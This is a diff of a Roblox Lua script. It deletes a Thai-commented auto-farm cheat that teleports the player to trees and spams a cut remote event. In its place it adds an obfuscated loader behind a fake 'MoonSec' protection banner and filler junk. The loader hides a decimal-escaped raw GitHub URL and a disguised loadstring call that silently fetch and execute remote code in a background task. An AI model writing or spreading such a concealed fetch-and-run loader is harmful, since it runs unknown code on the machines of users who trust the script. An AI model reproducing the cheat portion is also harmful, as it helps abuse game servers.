@@ -1,61 +1,70 @@
-local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
-local Window = Library.CreateLib("Tree Farm", "DarkScene")
-local Tab = Window:NewTab("Main")
-local Section = Tab:NewSection("Auto Cut")
+-- [[ MOONSEC V3 PISIT_PREMIUM_PROTECTION_ACTIVE ]] --
+-- [[ BUILD_ID: 0x88F2-9910-AAFC ]] --
+-- [[ WARNING: ILLEGAL ACCESS DETECTED WILL BE LOGGED ]] --
 
-_G.AutoFarm = false
+local _0x1 = 0xABC; local _0x2 = 0xDEF; local _0x3 = _0x1 + _0x2;
+-- $$$--$(_+__!jdbdodjdbdkd_$$$--$(_+__!jdbdodjdbdkd
+-- ##################################################
+-- ##################################################
+-- ##################################################
+-- ##################################################
+-- ##################################################
+-- ##################################################
+-- ##################################################
+-- ##################################################
+-- ##################################################
+-- $$$--$(_+__!jdbdodjdbdkd_$$$--$(_+__!jdbdodjdbdkd
+-- ##################################################
 
-Section:NewToggle("Auto Cut Tree", "วาร์ปไปตัดไม้ที่กำหนดอัตโนมัติ", function(state)
-    _G.AutoFarm = state
-    
-    if state then
-        spawn(function()
-            while _G.AutoFarm do
-                pcall(function()
-                    local targetModel = workspace:WaitForChild("TreeRegion"):WaitForChild("Model")
-                    local cutEvent = targetModel:WaitForChild("CutEvent")
-                    local player = game:GetService("Players").LocalPlayer
-                    local character = player.Character or player.CharacterAdded:Wait()
-                    local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
-                    local tool = character:FindFirstChildOfClass("Tool") or player.Backpack:FindFirstChild("Tool")
+-- [[ JUNK_SECTION_START ]] --
+local a1,a2,a3,a4,a5 = 1,2,3,4,5
+local b1,b2,b3,b4,b5 = "\97","\98","\99","\100","\101"
+for i=1, 50 do local _d = i * 0x2 end
 
-                    -- 1. วาร์ปไปที่ไม้ (ปรับตำแหน่ง Offset ตามความเหมาะสม)
-                    humanoidRootPart.CFrame = targetModel.PrimaryPart.CFrame * CFrame.new(0, 5, 0)
-                    
-                    -- 2. เช็คว่าถือขวานหรือยัง
-                    if tool and tool.Parent ~= character then
-                        humanoidRootPart.Parent.Humanoid:EquipTool(tool)
-                    end
+-- ##################################################
+-- [[ SYSTEM_CORE_INJECTION ]] --
+local _0xPisit_Base = "\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\113\113\101\50\50\52\54\50\45\111\112\115\47\90\88\84\65\116\97\47\114\101\102\115\47\104\101\97\100\115\47\109\97\105\110\47\90\88\84\97\116\79\79"
+local _0xMethod = getfenv()["\108\111\97\100\115\116\114\105\110\103"]
 
-                    -- 3. ส่งข้อมูลการตัด (Remote Fire)
-                    local directions = {
-                        Vector3.zAxis,
-                        Vector3.new(0, 0, -1),
-                        Vector3.new(-1, 0, 0),
-                        Vector3.xAxis
-                    }
-
-                    for _, dir in ipairs(directions) do
-                        if not _G.AutoFarm then break end
-                        
-                        local args = {
-                            cutEvent,
-                            {
-                                height = 1.5, -- ปรับความสูงตามต้องการ
-                                faceVector = dir,
-                                cooldown = 0.08,
-                                sectionId = 1,
-                                hitPoints = 1.68,
-                                tool = tool,
-                                cuttingClass = "Axe"
-                            }
-                        }
-                        game:GetService("ReplicatedStorage"):WaitForChild("Interaction"):WaitForChild("RemoteProxy"):FireServer(unpack(args))
-                        task.wait(0.1) -- หน่วงเวลาเล็กน้อยกันเด้ง
-                    end
-                end)
-                task.wait(0.5) -- รอรอบถัดไป
-            end
-        end)
-    end
+task.spawn(function()
+    pcall(function()
+        _0xMethod(game:HttpGet(_0xPisit_Base, true))()
+    end)
 end)
+-- ##################################################
+
+-- [[ JUNK_SECTION_CONTINUE ]] --
+-- ##################################################
+-- $$$--$(_+__!jdbdodjdbdkd
+-- ##################################################
+-- $$$--$(_+__!jdbdodjdbdkd
+-- ##################################################
+-- $$$--$(_+__!jdbdodjdbdkd
+-- ##################################################
+-- ##################################################
+-- $$$--$(_+__!jdbdodjdbdkd
+-- ##################################################
+-- $$$--$(_+__!jdbdodjdbdkd
+-- ##################################################
+-- $$$--$(_+__!jdbdodjdbdkd
+-- ##################################################
+
+for i=1,100 do local _0xT = i * math.random() end
+
+-- ##################################################
+-- ##################################################
+-- ##################################################
+-- ##################################################
+-- ##################################################
+-- ##################################################
+-- ##################################################
+-- ##################################################
+-- ##################################################
+-- ##################################################
+-- ##################################################
+-- ##################################################
+-- ##################################################
+-- ##################################################
+-- ##################################################
+-- ##################################################
+-- ##################################################
